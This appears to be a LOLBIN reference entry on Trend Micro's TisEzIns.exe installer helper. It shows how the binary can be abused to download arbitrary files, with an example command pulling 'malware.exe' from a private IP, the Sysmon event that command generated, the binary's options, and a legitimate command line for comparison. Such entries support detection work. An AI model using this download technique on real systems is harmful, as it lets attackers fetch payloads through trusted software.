# TisEzIns (Trend Micro)

## Summary

- **Description**: `Helps download the Trend Micro software installer`

The `TisEzIns` binary bundled with TrendMicro installer and used by it to download the latest version of TrendMicro can be abused to download arbitrary file.

### Example

```powershell
TisEzIns.exe /b /u "http://10.10.1.10/malware.exe" /f "C:\path\to\save\malware.exe"
```

Generated event

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>11</EventID> 
  <Version>2</Version> 
  <Level>4</Level> 
  <Task>11</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2023-05-11 17:31:30.0297853Z" /> 
  <EventRecordID>1721279854</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="6488" ThreadID="8544" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>XXXXX</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2023-05-11 17:31:30.029</Data> 
  <Data Name="ProcessGuid">{9a08371b-9561-6476-3d05-030000002800}</Data> 
  <Data Name="ProcessId">36616</Data> 
  <Data Name="Image">C:\LabStuff\TrendMicro-LOLBIN\Vizor32\TisEzIns.exe</Data> 
  <Data Name="TargetFilename">C:\path\to\save\malware.exe</Data> 
  <Data Name="CreationUtcTime">2023-05-11 17:31:30.029</Data> 
  <Data Name="User">XXXXX</Data> 
  </EventData>
  </Event>
```

### Command-Line Options

```yml
IPC:
    -a <agent>,    Specify the user agent used in the HTTP protocol
    -w <event>,    Wait for an windows event
    -p <event>,    Paule an windows event
FileName:
    -f <path>,     The full path of downloaded file. Use CWD + original file name if no specification
URL:
    -u <url>,      The target file location
Options:
    -e <epid>,     Register event callback
    -m <value>,    MD5 value
    -v <log_type>, Verbose Mode
    -h,            Display usage
    -c,            Continue previous downloading
    -b,            Run downloaded in background
```

For reference, a legitimate CLI would look something like this:

```powershell
"C:\ProgramData\Trend Micro Installer\TrendMicro_XX.X_HE_Full_XXXXXX\Vizor32\TisEzIns.exe" /v XXXX /b /e XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX /u "https://files.trendmicro.com/products/XXXXXXX/XX.X_XXXX/Global/XXXXXXXX/TrendMicro_XX.X_XXXX_HE_64bit.exe" /c /m XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX /p TREND_VIZOR_GLOBAL_EVENT_CONNECTION_ESTABLISHED /w TREND_VIZOR_GLOBAL_EVENT_SIA_DOWNLOAD_NOW /a XXXXXXXXXXX /f "C:\WINDOWS\temp\trend download\TrendMicro_Download.exe"
```
